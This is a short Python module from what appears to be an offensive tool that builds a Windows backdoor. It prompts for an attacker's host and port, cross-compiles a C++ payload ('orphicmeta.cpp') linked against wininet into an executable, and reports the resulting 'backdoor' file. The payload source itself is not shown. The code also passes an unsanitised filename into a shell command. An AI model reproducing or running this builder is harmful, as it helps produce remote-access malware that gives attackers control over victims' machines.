import os
import colorama
from colorama import Fore, Style
from .hostnport import *

tag_blue = Style.BRIGHT + Fore.LIGHTBLUE_EX + "[+]" + Style.RESET_ALL
tag_green = Style.BRIGHT + Fore.LIGHTGREEN_EX + "[*]" + Style.RESET_ALL
tag_red = Style.BRIGHT + Fore.LIGHTRED_EX + "[-]" + Style.RESET_ALL
tag_yellow = Style.BRIGHT + Fore.LIGHTYELLOW_EX + "[!]" + Style.RESET_ALL


def generate_file(filename):
    prompt_host_and_port()
    if(os.name == "nt"):
        # Insert joke here
        os.system("g++ -MD -Os -s orphicmeta.cpp -o "+filename+" -lwininet")
    else:
        # Insert Joke here
        os.system("i686-w64-mingw32-g++ -MD -Os -s orphicmeta.cpp -o "+filename+" -lwininet")       

    try:
        backdoor = open(filename, "r")
        filesize = os.path.getsize(filename)
        print(tag_green +" Final size of exe file : " + str(filesize) + " bytes...")
        location = os.path.abspath(filename)
        print(tag_blue + " File : " + str(location))
    except FileNotFoundError:
        print(tag_red + " Failed to Compile the Backdoor.") 